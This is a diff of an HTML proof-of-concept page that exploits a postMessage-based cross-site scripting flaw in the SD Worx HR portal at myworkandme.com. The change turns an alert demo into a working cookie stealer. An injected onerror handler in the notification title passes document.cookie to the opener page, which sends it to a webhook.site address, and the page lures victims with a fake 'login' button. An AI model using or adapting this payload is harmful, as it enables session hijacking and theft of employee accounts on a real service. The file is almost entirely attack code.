@@ -1,28 +1,31 @@
 <!DOCTYPE html>
-<html>
-<body>
-  <button onclick="attack()">Click to login to SD Worx HR</button>
-  <script>
-    function attack() {
-      // user gesture required for window.open() to not be blocked
-      var win = window.open('https://www.myworkandme.com/ebloxhr/hrwwevo/', '_blank');
+  <html>
+  <body>
+    <button onclick="attack()">Click to login to SD Worx HR</button>
+    <script>
+      window.addEventListener('message', function(e) {
+        if (e.origin === 'https://www.myworkandme.com') {
+          fetch('https://webhook.site/ac45a955-b680-4e3b-ae03-2119a0e5ce54?c=' + encodeURIComponent(e.data));
+        }
+      });
 
-      // wait for the shell to bootstrap ServiceBusImpl (~4s)
-      setTimeout(function () {
-        win.postMessage({
-          headers: {},
-          message: {
-            type: 'HRWW_NOTIFY',
-            notification: {
-              type: 'error',
-              title: "<img src=x onerror=alert(document.domain)>",
-              messages: [],
-              solutions: null
+      function attack() {
+        var win = window.open('https://www.myworkandme.com/ebloxhr/hrwwevo/', '_blank');
+        setTimeout(function () {
+          win.postMessage({
+            headers: {},
+            message: {
+              type: 'HRWW_NOTIFY',
+              notification: {
+                type: 'error',
+                title: "<img src=x onerror=\"window.opener.postMessage(document.cookie,'*')\">",
+                messages: [],
+                solutions: null
+              }
             }
-          }
-        }, '*');
-      }, 4000);
-    }
-  </script>
-</body>
-</html>
+          }, '*');
+        }, 5000);
+      }
+    </script>
+  </body>
+  </html>
